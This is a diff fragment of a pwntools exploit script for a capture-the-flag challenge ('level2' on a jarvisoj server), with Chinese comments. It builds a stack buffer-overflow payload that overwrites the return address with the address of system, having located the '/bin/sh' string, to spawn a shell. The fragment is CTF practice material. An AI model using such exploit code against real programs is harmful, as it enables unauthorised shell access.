@@ -4,10 +4,11 @@
 from pwn import *
 
 io = remote("pwn2.jarvisoj.com",9878)
+# io = process('stack')
 elf = ELF("./level2")
 
 sys_addr = elf.symbols["system"]                     # IDA对应的函数为 _system 0x08048320
-bin_addr = elf.search("/bin/sh".encode()).__next__() # IDA可见 0x804a024
+bin_addr = elf.search(b"/bin/sh").__next__() # IDA可见 0x804a024
 
 payload = 'a'*(0x88 + 0x4)                 #辣鸡填充值
 payload += p32(sys_addr).decode('latin')   #覆盖返回地址到system函数
